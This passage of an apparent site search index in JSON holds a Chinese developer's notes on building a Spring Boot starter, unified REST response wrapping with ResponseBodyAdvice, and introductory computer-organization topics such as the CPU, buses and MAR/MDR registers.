<p>\u4f46\u662f\u5982\u679c\u5176\u4ed6\u6a21\u5757\u4e5f\u9700\u8981\u7528\u8fd9\u4e2a\u529f\u80fd\uff0c\u90a3\u4e48\u6211\u9700\u8981\u901a\u8fc7\u590d\u5236\u7684\u65b9\u5f0f\u914d\u7f6e\uff0c\u4f46\u662f\u590d\u5236\u662f\u7f16\u7a0b\u4e2d\u7684\u4e00\u5927\u5fcc\u8bb3\uff0c\u590d\u5236\u5e26\u6765\u7684BUG\u662f\u6700\u611a\u8822\u7684BUG\u3002\u56e0\u6b64\u9700\u8981\u62bd\u79bb\u51fa\u4e00\u4e2a\u516c\u7528\u6a21\u5757\u65b9\u4fbf\u5176\u4ed6\u6a21\u5757\u4f7f\u7528\u3002</p>"},{"location":"Record%26Review/%E7%8C%AB%E5%92%AA%E5%B0%8F%E7%A8%8B%E5%BA%8F/#_13","title":"\u89e3\u51b3\u65b9\u6848","text":"<p>\u4e00\u5f00\u59cb\u6211\u7684\u60f3\u6cd5\u5f88\u7b80\u5355\uff0c\u76f4\u63a5\u5c06\u4ee3\u7801\u62bd\u79bb\u51fa\u6765\uff0c\u653e\u5230\u4e00\u4e2acommon\u6a21\u5757\u4e2d\uff0c\u7136\u540e\u5176\u4ed6\u6a21\u5757\u901a\u8fc7maven\u5f15\u7528\u5408\u683c\u6a21\u5757\u5c31\u53ef\u4ee5\u4e86\uff0c\u4f46\u662f\u8fd9\u4e48\u505a\u51fa\u73b0\u4e86\u4e00\u4e2a\u95ee\u9898\uff0c\u90a3\u5c31\u662f\u8fd9\u4e2a\u6a21\u5757\u662f\u9700\u8981\u57fa\u4e8eSpringboot\u8fdb\u884c\u7ba1\u7406\u7684\uff0c\u800cSpringboot\u5728\u6ca1\u6709\u7279\u6b8a\u6307\u5b9a\u6216\u8005\u4e13\u95e8\u914d\u7f6e\u7684\u60c5\u51b5\u4e0b\u53ea\u4f1a\u6258\u7ba1\u542f\u52a8\u7c7b\u6240\u5728\u7684\u5305\u4e0b\u9762\u7684\u7c7b\u3002\u4f46\u662f\u516c\u5171\u6a21\u5757\u4e0d\u77e5\u9053\u5f15\u7528\u6a21\u5757\u7684\u542f\u52a8\u7c7b\u5728\u54ea\u4e86\u3002</p> <p>\u6700\u5f00\u59cb\u6211\u4f7f\u7528\u7684\u89e3\u51b3\u529e\u6cd5\u5f88\u7b80\u5355\uff0c\u5c06\u516c\u5171\u6a21\u5757\u6240\u5728\u7684\u5305\u6dfb\u52a0\u5230Springboot\u7684\u626b\u63cf\u5305\u4e2d</p> <pre><code>@SpringBootApplication(scanBasePackages = \"com.xtu.leotan\")\npublic class CatWikiApplication {\n    public static void main(String[] args) {\n        SpringApplication.run(CatWikiApplication.class, args);\n    }\n}\n</code></pre> <p>\u867d\u7136\u6709\u70b9\u50bb\uff0c\u4f46\u662f\u53ef\u4ee5\u7528\uff0c\u4f46\u662f\u540e\u9762\u5c31\u53d1\u73b0\u4e86\u95ee\u9898\u3002</p> <ol> <li>\u626b\u63cf\u7684\u5305\u8def\u5f84\u592a\u5927\uff0c\u542f\u52a8\u901f\u5ea6\u6536\u5230\u5f71\u54cd</li> <li>\u8bbe\u8ba1\u539f\u5219\u91cc\u9762\uff0c\u4f5c\u4e3a\u670d\u52a1\u8c03\u7528\u8005\uff0c\u5e94\u8be5\u4e0d\u9700\u8981\u8003\u8651\u670d\u52a1\u63d0\u4f9b\u8005\u7684\u7ec6\u8282\uff0c\u800c\u8fd9\u91cc\u8fd8\u9700\u8981\u77e5\u9053\u8fd9\u4e2a\u7684\u7ed3\u6784\u3002</li> </ol> <p>\u6211\u60f3\u5230\u90a3\u4e9b\u5199\u7ed9spring\u7528\u7684starter\u597d\u50cf\u5c31\u662f\u89e3\u51b3\u4e86\u8fd9\u4e00\u95ee\u9898\uff0c\u4e8e\u662f\u5728\u7f51\u4e0a\u5bfb\u627e\u5982\u4f55\u5199\u4e00\u4e2astarter\u3002\u8fd9\u91cc\u8fd8\u5b58\u5728\u4e00\u4e2a\u5c0f\u5751\u3002\u9700\u8981\u6ce8\u610f\u7248\u672c\u95ee\u9898\u3002</p> <ul> <li>Springboot3\u4ee5\u524d</li> </ul> <p>\u8981\u5199\u4e00\u4e2astarter\uff0c\u6211\u4eec\u9700\u8981\u6709\u4e00\u4e2a\u914d\u7f6e\u6587\u4ef6\u6765\u8bf4\u660e\u6a21\u5757\u5e94\u8be5\u5982\u4f55\u6709Springboot\u6258\u7ba1\uff0c\u548bSpringboot3\u4ee5\u524d\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5728<code>resources</code>\u76ee\u5f55\u4e0b\u5efa\u4e00\u4e2a\u6587\u4ef6<code>META-INF/spring.factories</code>\uff0c\u7136\u540e\u5728\u91cc\u9762\u5199\u4e0a\u76f8\u5e94\u7684\u914d\u7f6e\u8282\uff0c\u8fd9\u4e9b\u6559\u7a0b\u5f88\u591a\uff0c\u5e94\u4e3aspringboot2\u90fd\u5df2\u7ecf\u51fa\u6765\u5f88\u4e45\u4e86\uff0c\u6211\u4eec\u5728\u7f51\u4e0a\u770b\u5230\u7684\u53ef\u80fd\u5927\u591a\u6570\u4e5f\u662f\u8fd9\u4e00\u8bf4\u6cd5\u3002\u8fd9\u91cc\u7ed9\u51fa\u5b98\u65b9\u7684\u4e00\u4e2a\u6587\u6863\u8bf4\u660e\u3002\uff08\u7f51\u4e0a\u6709\u4e9b\u6559\u7a0b\u8bf4\u6253\u5305\u65b9\u5f0f\u7528pom\u624d\u80fd\u751f\u6548\uff0c\u771f\u5b9e\u5bb3\u4eba\u4e0d\u6d45\uff01\uff01\uff09</p> <p>46. Creating your own auto-configuration (spring.io)</p> <p>\u7b80\u5355\u4e00\u70b9\u7528\u5c31\u662f\uff1a\u65b0\u5efa\u4e00\u4e2a\u914d\u7f6e\u7c7b\uff08<code>@Configuration</code>\u7b49\u90fdOK\uff09\uff0c\u7136\u540e\u5728\u914d\u7f6e\u7c7b\u4e2d\u914d\u7f6e\u597dBean\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u6307\u5b9a\u5305\u626b\u63cf\u3002\u7136\u540e\u65b0\u5efa\u914d\u7f6e\u6587\u4ef6\uff0c\u5728\u5176\u4e2d\u6307\u5b9a\u8fd9\u4e2a\u914d\u7f6e\u7c7b\u5373\u53ef\uff0c\u914d\u7f6e\u6587\u4ef6\u5982\u4e0b</p> <pre><code>org.springframework.boot.autoconfigure.EnableAutoConfiguration = com.xtu.leotan.log.AutoConfiguration\n</code></pre> <ul> <li>Springboot3</li> </ul> <p>\u4e0a\u9762\u7684\u65b9\u5f0f\u5728Springboot3\u8d77\u4e0d\u5230\u4efb\u4f55\u4f5c\u7528\uff0cspringboot3\u5728\u7f51\u4e0a\u7684\u6559\u7a0b\u4e5f\u5f88\u5c11\uff0c\u7ec8\u4e8e\u627e\u5230\u4e00\u7bc7\u4e86</p> <p>spring.factories\u5c06\u88ab\u5f03\u7528\uff0c\u505a\u597dGet\u65b0\u6280\u80fd\u7684\u51c6\u5907\u4e86\u5417-CSDN\u535a\u5ba2</p> <p>\u6211\u4eec\u4e5f\u53ef\u4ee5\u770b\u770b\u5b98\u65b9\u662f\u5982\u4f55\u4f7f\u7528\u7684</p> <p>spring-boot/spring-boot-project/spring-boot-autoconfigure/src/main/resources/META-INF/spring/org.springframework.boot.autoconfigure.AutoConfiguration.imports at main \u00b7 spring-projects/spring-boot (github.com)</p> <p>\u5176\u5b9e\u5c31\u662f<code>META-INF/spring.factories</code>\u53d8\u6210<code>META-INF/spring/org.springframework.boot.autoconfigure.AutoConfiguration.imports</code>\uff0c\u7136\u540e\u76f4\u63a5\u5728\u91cc\u9762\u534f\u5546\u914d\u7f6e\u7c7b\u7684\u5168\u9650\u5b9a\u540d</p>"},{"location":"Record%26Review/%E7%8C%AB%E5%92%AA%E5%B0%8F%E7%A8%8B%E5%BA%8F/#_14","title":"\u7edf\u4e00\u8fd4\u56de\u503c","text":""},{"location":"Record%26Review/%E7%8C%AB%E5%92%AA%E5%B0%8F%E7%A8%8B%E5%BA%8F/#_15","title":"\u95ee\u9898\u63cf\u8ff0","text":"<p>\u5728\u524d\u540e\u7aef\u5206\u79bb\u7684\u9879\u76ee\u4e2d\uff0c\u540e\u7aef\u548c\u524d\u7aef\u7684\u5f00\u53d1\u4eba\u5458\u9700\u8981\u6c9f\u901a\u597d\u4e00\u4e9b\u63a5\u53e3\u534f\u8bae\uff0c\u63a8\u8350\u4f7f\u7528RESTful\u89c4\u8303\uff0c\u7136\u800c\u63a5\u53e3\u7684\u8fd4\u56de\u683c\u5f0f\u9700\u8981\u6211\u4eec\u81ea\u5df1\u534f\u5546\u3002\u63a8\u8350\u7684\u539f\u5219\u662f\u6700\u5916\u5c42\u7684\u8fd4\u56de\u7edf\u4e00\u5f62\u5f0f\u3002</p> <p>\u7f51\u4e0a\u4e5f\u6709\u5f88\u591a\u7edf\u4e00\u8fd4\u56de\u5f62\u5f0f\u7684\u6559\u7a0b\uff0c\u4f46\u662f\u5927\u591a\u6570\u90fd\u662f\u6559\u4f60\u7528\u4e00\u4e2a\u6cdb\u578b\u7c7b\u5c06\u5176\u5305\u88c5\u4e00\u4e0b\uff0c\u867d\u7136\u53ef\u7528\uff0c\u4f46\u662f\u4e0d\u597d\u7528\u3002\u6211\u4e4b\u524d\u6ca1\u63a5\u89e6aop\u7684\u65f6\u5019\u7684\u786e\u7528\u7684\u5c31\u662f\u8fd9\u79cd\u65b9\u6cd5\uff0c\u4f46\u662f\u8fd9\u6837\u4f1a\u6709\u5f88\u591a\u95ee\u9898\uff1a</p> <ol> <li>\u6bcf\u4e2a\u5730\u65b9\u90fd\u9700\u8981\u8fd4\u56de\u8fd9\u79cd\u7c7b\u578b\uff0c\u5199\u8d77\u6765\u5f88\u9ebb\u70e6\uff0c\u5f88\u591a\u91cd\u590d\u7684\u4ee3\u7801\u7247\u6bb5\u3002\u5373\u4f7f\u5c06\u5176\u62bd\u8c61\u51fa\u6765\u4f5c\u4e3a\u4e00\u4e2a\u51fd\u6570\u4e5f\u4e0d\u4f18\u96c5\u3002</li> <li>\u4fb5\u5165\u5f0f\u53d8\u6210\uff0c\u5bf9\u4e8e\u8fd9\u4e2a\u975e\u4e1a\u52a1\u4e0a\u7684\u529f\u80fd\uff0c\u5374\u5bfc\u81f4\u4e1a\u52a1\u4ee3\u7801\u53d1\u751f\u53d8\u5316\uff0c\u8fd9\u662f\u5f88\u5371\u9669\u7684\uff0c\u5e76\u4e14\u4e07\u4e00\u90a3\u4e2a\u63a5\u53e3\u5fd8\u8bb0\u6309\u7167\u89c4\u8303\u7f16\u5199\uff0c\u90a3\u4e0d\u76f4\u63a5\u5bc4\u3002</li> <li>\u5f53\u4f60\u8fd9\u4efd\u4ee3\u7801\u6709\u7b2c\u4e8c\u4e2a\u4eba\u63a5\u76d8\u65f6\uff0c\u522b\u4eba\u770b\u5230\u8bb8\u591a\u8ddf\u4e1a\u52a1\u903b\u8f91\u65e0\u5173\u7684\u4ee3\u7801\u3002\u4e0a\u624b\u7684\u5b66\u4e60\u6210\u672c\u592a\u9ad8\u3002</li> </ol>"},{"location":"Record%26Review/%E7%8C%AB%E5%92%AA%E5%B0%8F%E7%A8%8B%E5%BA%8F/#_16","title":"\u89e3\u51b3\u65b9\u6848","text":"<p>\u9047\u5230\u8fd9\u4e2a\u95ee\u9898\uff0c\u6211\u5f53\u65f6\u60f3\u5230\u7684\u662f\u4f7f\u7528aop\uff0c\u5c31\u50cf\u4e0a\u9762\u7684\u6253\u5370\u8bf7\u6c42\u65e5\u5fd7\u4e00\u6837\u3002\u610f\u6599\u4e4b\u5916\u7684\u4e8b\u60c5\u662f\uff0cSpringMVC\u65e9\u5c31\u5e2e\u4f60\u60f3\u5230\u8fd9\u4ef6\u4e8b\u60c5\uff0c\u63d0\u4f9b\u4e86\u4e00\u4e2a\u53eb<code>ResponseBodyAdvice&lt;T&gt;</code>\u7684\u63a5\u53e3\u7136\u4f60\u5b9e\u73b0\uff0c\u505a\u4e8e\u662f\u6709\u5404\u79cd\u5341\u5206\u4f18\u96c5\u5730\u65b9\u5f0f\u5c31\u5f62\u6210\u4e86\u3002</p> <pre><code>// \u7edf\u4e00\u8fd4\u56de\u5305\u88c5\u7c7b\n@Data\n@AllArgsConstructor\npublic class CommonResult&lt;T&gt; {\n\n    private final static int SUCCESS_CODE = 200;\n\n    private final static int FAIL_CODE = 400;\n    private final static int ERROR_CODE = 500;\n\n    private final static String SUCCESS_MESSAGE = \"\u6210\u529f\";\n    private int code;\n\n    private String message;\n\n    private T data;\n\n    private Long timestamp;\n\n\n    public static &lt;T&gt; CommonResult&lt;T&gt; success(T data) {\n        return new CommonResult&lt;&gt;(SUCCESS_CODE, SUCCESS_MESSAGE, data, System.currentTimeMillis());\n    }\n\n    public static &lt;T&gt; CommonResult&lt;T&gt; fail(String message) {\n        return new CommonResult&lt;&gt;(FAIL_CODE, message, null, System.currentTimeMillis());\n    }\n\n    public static CommonResult&lt;String&gt; error(String message) {\n        return new CommonResult&lt;&gt;(FAIL_CODE, message, null, System.currentTimeMillis());\n    }\n}\n// ================= \u589e\u5f3a\u5668 ============\n@RestControllerAdvice\npublic class ResponseAdvice implements ResponseBodyAdvice&lt;Object&gt; {\n    @Autowired\n    private ObjectMapper objectMapper;\n\n    @Override\n    public boolean supports(MethodParameter returnType, Class&lt;? extends HttpMessageConverter&lt;?&gt;&gt; converterType) {\n        return true;\n    }\n\n    @Override\n    @SneakyThrows\n    public Object beforeBodyWrite(Object body, MethodParameter returnType, MediaType selectedContentType, Class&lt;? extends HttpMessageConverter&lt;?&gt;&gt; selectedConverterType, ServerHttpRequest request, ServerHttpResponse response) {\n        if (body instanceof String) {\n            return objectMapper.writeValueAsString(CommonResult.success(body));\n        }\n        if (body instanceof CommonResult&lt;?&gt; commonResult) {\n            return commonResult;\n        }\n        return CommonResult.success(body);\n    }\n}\n\n// ================= \u7edf\u4e00\u7684\u5f02\u5e38\u5904\u7406\n@Slf4j\n@RestControllerAdvice\n@ResponseBody\npublic class RestExceptionHandler {\n    @ExceptionHandler(Exception.class)\n    public CommonResult&lt;String&gt; exceptionHandler(Exception e) {\n        log.error(\"Unknown Exception:{}\", e.getMessage(), e);\n        return CommonResult.error(e.getMessage());\n    }\n}\n</code></pre> <p>\u8fd9\u91cc\u6709\u4e2a\u5c0f\u7ec6\u8282\uff0c\u5c31\u662f\u5982\u679c\u6211\u4eec\u4e0d\u5bf9<code>RestControllerAdvice</code>\u52a0\u4e0a\u8303\u56f4\u9650\u5236\uff0c\u4ed6\u53ef\u80fd\u4f1a\u5bfc\u81f4\u5176\u4ed6\u4e2d\u95f4\u4ef6\u65e0\u6cd5\u6b63\u5e38\u5de5\u4f5c\uff0c\u6700\u5178\u578b\u7684\u4fbf\u662fswagger\uff0c\u56e0\u6b64\u5efa\u8bae\uff1a</p> <ol> <li>\u62e6\u622a\u5668\u4e0d\u8981\u5199\u5728\u516c\u5171\u6a21\u5757\u4e2d\uff0c\u56e0\u4e3a\u4ed6\u53ef\u80fd\u4f5c\u7528\u5230\u6211\u4eec\u65e0\u6cd5\u9884\u6599\u7684\u5730\u65b9</li> <li>\u62e6\u622a\u5668\u4e00\u5b9a\u8981\u5206\u6790\u6e05\u695a\u4f5c\u7528\u57df\uff0c\u5efa\u8bae\u52a0\u4e0a\u4f5c\u7528\u57df\u9650\u5236</li> </ol>"},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9A%84%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/","title":"\u8ba1\u7b97\u673a\u7684\u7ec4\u6210\u539f\u7406","text":"<p>\u5b66\u597d\u5e95\u5c42\uff0c\u63a2\u7d22\u8ba1\u7b97\u673a\u5e95\u5c42\u539f\u7406\uff0c\u6253\u597d\u8ba1\u7b97\u673a\u57fa\u7840\uff0c\u52a0\u6cb9\uff01\uff08\u5927\u4e8c\u4e13\u4e1a\u8bfe\uff09</p>"},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9A%84%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_2","title":"\u4e00\u3001\u8ba1\u7b97\u673a\u57fa\u7840","text":""},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9A%84%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#11","title":"1.1\u8ba1\u7b97\u673a\u786c\u4ef6\u6784\u6210","text":"<ol> <li> <p>\u4e2d\u592e\u5904\u7406\u5668(CPU)\uff1a</p> </li> <li> <p>\u7b97\u6570\u8fd0\u7b97\u5355\u5143\uff08ALU\uff09\uff1a\u4e3b\u8981\u7528\u4e8e\u7b97\u672f\u8fd0\u7b97\u3001\u903b\u8f91\u8fd0\u7b97\u3001\u79fb\u4f4d\u7b49\u5404\u79cd\u6570\u636e\u64cd\u4f5c\u3002\u548c\u5bc4\u5b58\u5668\u534f\u8c03\u5de5\u4f5c\uff0c\u8ba1\u7b97\u7ed3\u679c\u7531\u5185\u90e8\u603b\u7ebf\u8fd4\u56de\u5bc4\u5b58\u5668\uff0c\u8fd0\u7b97\u7ed3\u679c\u7684\u7279\u5f81\u653e\u5728\u7279\u6b8a\u5bc4\u5b58\u5668\u4e4b\u4e2d\u3002</p> </li> <li>\u63a7\u5236\u5668\uff08CU\uff09\uff1a\u7531\u6307\u4ee4\u5bc4\u5b58\u5668\u3001\u6307\u4ee4\u8bd1\u7801\u5668\u548c\u65f6\u5e8f\u90e8\u4ef6\u7ec4\u6210\u3002\u6309\u4e00\u5b9a\u987a\u5e8f\u5728\u50a8\u5b58\u5668\u4e2d\u8bfb\u53d6\u6307\u4ee4\u3001\u8bd1\u7801\uff0c\u5728\u65f6\u949f\u4fe1\u53f7\u63a7\u5236\u4e0b\u53d1\u9001\u4e00\u7cfb\u5217\u64cd\u4f5c\u547d\u4ee4\u3002</li> <li> <p>\u5bc4\u5b58\u5668\uff08Register\uff09\uff1a\u7528\u6765\u5b58\u653e\u64cd\u4f5c\u6570\u3001\u4e2d\u95f4\u7ed3\u679c\u3001\u548c\u53cd\u6620\u8fd0\u7b97\u7ed3\u679c\u7684\u72b6\u6001\u6807\u5fd7\u7b49\u3002</p> </li> <li> <p>\u603b\u7ebf\uff08Bus\uff09\uff1a</p> </li> </ol> <p>\u628a\u8ba1\u7b97\u673a\u7684\u5404\u4e2a\u90e8\u5206\u8fde\u63a5\u8d77\u6765\u7684\u4fe1\u53f7\u7ebf\uff0c\u662f\u4e2a\u90e8\u5206\u4fe1\u606f\u4ea4\u6362\u7684\u516c\u5171\u901a\u9053\u3002</p> <ul> <li>\u5730\u5740\u603b\u7ebf\uff08AB\uff09\uff1a\u8d1f\u8d23\u4f20\u8f93\u6570\u636e\u7684\u50a8\u5b58\u4f4d\u7f6e\u7684\u4e00\u7ec4\u4fe1\u53f7\u7ebf\u3002\u4f20\u8f93CPU\u53d1\u9001\u7684\u5730\u5740\uff0c\u4e00\u904d\u9009\u4e2dCPU\u6240\u9700\u8981\u7684\u5b58\u50a8\u5355\u5143\u6216I/O\u63a5\u53e3\u3002</li> <li>\u6570\u636e\u603b\u7ebf\uff08DB\uff09\uff1a\u8d1f\u8d23\u4f20\u8f93\u6570\u636e\u7684\u4e00\u7ec4\u4fe1\u53f7\u7ebf\u3002\u6570\u636e\u5728CPU\u548c\u5b58\u50a8\u5668\u3001I/O\u63a5\u53e3\u4e4b\u95f4\u7684\u4f20\u9001\u662f\u53cc\u5411\u7684\uff0c\u56e0\u6b64\u53c8\u53ef\u79f0\u4e3a\u53cc\u5411\u603b\u7ebf\u3002\u4f20\u9001\u7684\u6570\u636e\u662f\u5e7f\u4e49\u7684\u6570\u636e\uff0c\u5305\u62ec\u72ed\u4e49\u7684\u6570\u636e\u548c\u6307\u4ee4\u4ee3\u7801\u3002</li> <li> <p>\u63a7\u5236\u603b\u7ebf\uff08CB\uff09\uff1a\u4f20\u8f93\u548c\u4ea4\u6362\u6570\u636e\u65f6\u8d77\u5230\u7ba1\u7406\u63a7\u5236\u4f5c\u7528\u7684\u4e00\u7ec4\u4fe1\u53f7\u7ebf\u3002CPU\u5230I/O\u63a5\u53e3\u7684\u8bfb\u5199\u4fe1\u53f7[\\(\\overline{\\text{RD}}\\),\\(\\overline{\\text{WR}}\\)]\uff0cI/O\u63a5\u53e3\u548c\u5b58\u50a8\u5668\u5230CPU\u7684\u51c6\u5907\u5c31\u7eea\u548c\u7ec8\u7aef\u4fe1\u53f7\u7b49[READY,INT].</p> </li> <li> <p>\u5b58\u50a8\u5668\uff08Memory\uff09\uff1a</p> </li> </ul> <p>\u5b58\u50a8\u7a0b\u5e8f\u3001\u6570\u636e\u548c\u5404\u79cd\u4fe1\u53f7\u3001\u547d\u4ee4\u7b49\u4fe1\u606f\u3002</p> <ol> <li> <p>\u8f93\u5165\u8f93\u51fa\u63a5\u53e3\uff08I/O\u63a5\u53e3\uff09\uff1a</p> </li> <li> <p>\u7528\u4e8e\u7f13\u5b58\u6570\u636e\uff1a\u534f\u8c03\u8ba1\u7b97\u673a\u5185\u90e8\u548c\u5916\u90e8\u8bbe\u5907\u7684\u534f\u8c03\u5de5\u4f5c\uff08\u5185\u90e8\u901f\u5ea6\u8fc7\u5feb\uff09\u3002</p> </li> <li>\u4fe1\u606f\u683c\u5f0f\u8f6c\u5316\uff1a\u4f8b\u5982\u952e\u76d8\u4f7f\u7528\u7684\u662f\u4e32\u884c\u63a5\u53e3\uff0c\u800c\u8ba1\u7b97\u673a\u5185\u90e8\u662f\u5e76\u884c\u4f20\u8f93\u3002\u5e76\u4e14\u952e\u76d8\u6570\u636e\u4e94\u82b1\u516b\u95e8\uff0c\u9700\u8981\u8f6c\u6210\u7edf\u4e00\u7684\u6570\u636e\u683c\u5f0f\u3002</li> <li> <p>\u5411\u8ba1\u7b97\u673a\u4f20\u8fbe\u6307\u4ee4\uff0c\u62a5\u544a\u8fd0\u884c\u72b6\u6001\u3002</p> </li> <li> <p>\u8f93\u5165\u8f93\u51fa\u8bbe\u5907\uff08I/O\u8bbe\u5907\uff09\uff1a</p> </li> </ol> <p>\u901a\u8fc7I/O\u63a5\u53e3\u548c\u8ba1\u7b97\u673a\u76f8\u8fde\u63a5\u3002\u6bd4\u5982\u5e38\u89c1\u7684\u952e\u76d8\uff0c\u9f20\u6807\uff0c\u548c\u663e\u793a\u5c4f\u3002\u8fd9\u91cc\u8981\u6ce8\u610f\uff0c\u786c\u76d8\u5176\u5b9e\u662f\u5c5e\u4e8e\u5916\u90e8\u8bbe\u5907\uff0c\u5373\u4f7f\u4ed6\u662f\u5185\u7f6e\u7684\u3002\u7531\u6b64\u53ef\u77e5\uff0cI/O\u8bbe\u5907\u4e0d\u4ec5\u53ef\u4ee5\u4f5c\u4e3a\u8f93\u5165\u8f93\u51fa\u7684\u7a97\u53e3\uff0c\u4e5f\u53ef\u4ee5\u7528\u6765\u5b58\u50a8\u6570\u636e\u3002</p>"},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9A%84%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#12","title":"1.2 \u8ba1\u7b97\u673a\u7684\u5de5\u4f5c\u539f\u7406","text":"<p>1.1.1 \u6307\u4ee4\u4e0e\u6307\u4ee4\u96c6</p> <p>\u8ba1\u7b97\u673a\u5bf9\u4e8e\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u662f\u5982\u4f55\u6267\u884c\u7684\u5462\uff1f\u9996\u5148\u6211\u4eec\u8981\u533a\u522b\u4e00\u4e2a\u6982\u5ff5\uff0c\u6211\u4eec\u65e5\u5e38\u7f16\u5199\u7684\u7a0b\u5e8f\u90fd\u4e0d\u662f\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u53ea\u6709\u7f16\u8bd1\u8fde\u63a5\u540e\uff0c\u53ef\u4ee5\u4e0d\u4f9d\u8d56\u4efb\u4f55\u5e73\u53f0\u76f4\u63a5\u8fd0\u884c\u7684\u624d\u662f\u4e8c\u8fdb\u5236\u53ef\u6267\u884c\u6587\u4ef6\u3002\u5bf9\u4e8e\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u8ba1\u7b97\u673a\u662f\u5982\u4f55\u6267\u884c\u7684\u5462\uff1f\u8fd9\u5c31\u8981\u63d0\u53ca\u5230\u6307\u4ee4\u548c\u6307\u4ee4\u96c6\u4e86\u3002</p> <p>\u5728CPU\u4e2d\uff0c\u5382\u5bb6\u5f80\u5f80\u4f1a\u9884\u5b9a\u4e49\u4e00\u4e9b\u57fa\u672c\u7684\u64cd\u4f5c\uff0c\u6bd4\u5982\u52a0\u51cf\u4e58\u9664\u7b49\uff0c\u800c\u5bf9\u4e8e\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u53ea\u9700\u8981\u544a\u8bc9\u8ba1\u7b97\u673a\u201d\u4f60\u9700\u8981\u6267\u884c\u54ea\u4e00\u4e2a\u6307\u4ee4\u201c\u5373\u53ef\uff0c\u4f46\u662f\u5fc5\u987b\u8981\u6c42\u5728CPU\u4e2d\u6709\u8fd9\u4e9b\u6307\u4ee4\u3002\u8ba1\u7b97\u673a\u80fd\u6267\u884c\u7684\u5168\u90e8\u6307\u4ee4\u5c31\u53eb\u6307\u4ee4\u96c6\u3002\u6307\u4ee4\u96c6\u5e94CPU\u4fe1\u53f7\u800c\u5df2\uff0c\u4f46\u662f\u5bf9\u4e8e\u4f7f\u7528\u9ad8\u7ea7\u8bed\u8a00\u7684\u7a0b\u5e8f\u733f\u4eec\u57fa\u672c\u4e0d\u9700\u8981\u5173\u6ce8\uff0c\u800c\u5bf9\u4e8e\u6c47\u7f16\u8bed\u8a00\u4ece\u4e8b\u7740\u5c31\u9700\u8981\u8bb0\u4f4f\u4e00\u4e9b\u5e38\u89c1CPU\u7684\u6307\u4ee4\u96c6\u4e86\u3002</p> <p>CPU\u7684\u5de5\u4f5c\u539f\u7406</p> <p></p> <p>MAR</p> <p>MAR\u53eb\u505a\u5b58\u50a8\u5730\u5740\u5bc4\u5b58\u5668\uff0c\u4fdd\u5b58\u7684\u662f\u5b58\u50a8\u5355\u5143\u7684\u5730\u5740\uff0c\u5176\u4f4d\u6570\u53cd\u6620\u4e86\u5b58\u50a8\u5355\u5143\u7684\u4e2a\u6570\u3002</p> <p>\u6bd4\u5982\u670932\u4e2a\u5b58\u50a8\u5355\u5143\uff0c\u800c\u5b58\u50a8\u5355\u5143\u7684\u5730\u5740\u662f\u7528\u4e8c\u8fdb\u5236\u6765\u8868\u793a\u7684\uff0c\u90a3\u4e485\u4f4d\u4e8c\u8fdb\u5236\u6570\u5c31\u53ef\u4ee532\u4e2a\u5b58\u50a8\u5355\u5143\u3002\u90a3\u4e48\uff0cMAR\u7684\u4f4d\u6570\u5c31\u662f5\u4f4d\u3002</p> <p>\u5728\u5b9e\u9645\u8fd0\u7528\u4e2d\uff0c\u6211\u4eec \u77e5\u9053\u4e86MAR\u7684\u4f4d\u6570\uff0c\u5b58\u50a8\u5355\u5143\u7684\u4e2a\u6570\u4e5f\u53ef\u4ee5\u77e5\u9053\u4e86\u3002</p> <p>MDR</p> <p>MDR\u8868\u793a\u5b58\u50a8\u6570\u636e\u5bc4\u5b58\u5668\uff0c\u5176\u4f4d\u6570\u53cd\u6620\u5b58\u50a8\u5b57\u957f\u3002</p> <p>MDR\u5b58\u653e\u7684\u662f\u4ece\u5b58\u50a8\u5143\u4ef6\u8bfb\u51fa\uff0c\u6216\u8005\u8981\u5199\u5165\u67d0\u5b58\u50a8\u5143\u4ef6\u7684\u6570\u636e\uff08\u4e8c\u8fdb\u5236\u6570\uff09\u3002</p> <p>\u5982\u679cMDR=16,\uff0c\u6bcf\u4e2a\u5b58\u50a8\u5355\u5143\u8fdb\u884c\u8bbf\u95ee\u7684\u65f6\u5019\uff0c\u6570\u636e\u662f16\u4f4d\uff0c\u90a3\u4e48\u5b58\u50a8\u5b57\u957f\u5c31\u662f16\u4f4d\u3002</p> <p>\u4e3a\u81ea\u52a8\u8fde\u5b66\u7684\u6267\u884c\u7a0b\u5e8f\uff0c\u5fc5\u987b\u5148\u5c06\u7a0b\u5e8f\u548c\u6570\u636e\u9001\u5230\u5177\u6709\u8bb0\u5fc6\u529f\u80fd\u7684\u5b58\u50a8\u5668\u4e2d\u4fdd\u5b58\u8d77\u6765\uff0c\u7136\u540e\u6709CPU\u4f9d\u636e\u7a0b\u5e8f\u7684\u6307\u4ee4\u6267\u884c\u7684\u987a\u5e8f\u53d6\u51fa\u6307\u4ee4\u3001\u5206\u6790\u6307\u4ee4\u3001\u6267\u884c\u6307\u4ee4\uff0c\u76f4\u5230\u5c06\u5168\u90e8\u6307\u4ee4\u6267\u884c\u5b8c\u3002\u5728CPU\u91cc\u9762\u6709\u4e2a\u5bc4\u5b58\u5668\u53eb\u7a0b\u5e8f\u8ba1\u6570\u5668\uff08PC\uff09\uff0c\u5728\u6709\u4e9b\u5730\u65b9\u53c8\u53ef\u4ee5\u53eb\u6307\u4ee4\u6307\u9488\uff08IP\uff09\u3002\u6ca1\u9519\uff0c\u4ed6\u5c31\u662f\u7528\u6765\u6307\u5411\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u4f4d\u7f6e\u7684\u3002\u800cCP\u4e4b\u4e2d\u7684\u4f4d\u7f6e\u662f\u53ef\u4ee5\u88ab\u7a0b\u5e8f\u4fee\u6539\u7684\uff0c\u8fd9\u4e00\u5c31\u662f<code>if</code>\u8bed\u53e5\u5b9e\u73b0\u7684\u539f\u7406</p> <pre><code>graph 